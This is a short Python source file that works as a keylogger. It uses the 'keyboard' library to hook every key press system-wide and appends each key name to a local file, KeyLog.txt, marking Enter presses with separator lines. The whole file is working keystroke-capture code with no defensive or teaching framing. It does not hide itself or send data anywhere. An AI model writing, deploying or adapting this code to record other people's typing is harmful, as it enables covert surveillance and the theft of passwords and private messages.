import keyboard



def keyPress(event):

    with open("KeyLog.txt", "a") as f:
        if event.name == "enter":
            f.write('\n----------\n (Return) \n----------\n')
        else:
            f.write('{}'.format(event.name))
        # f.write('{}\n'.format(event.name))


def main():

    # logFile = createFile()

    log = open("KeyLog.txt", 'w')
    keyboard.on_press(keyPress)
    keyboard.wait()

if __name__ == "__main__":
    main()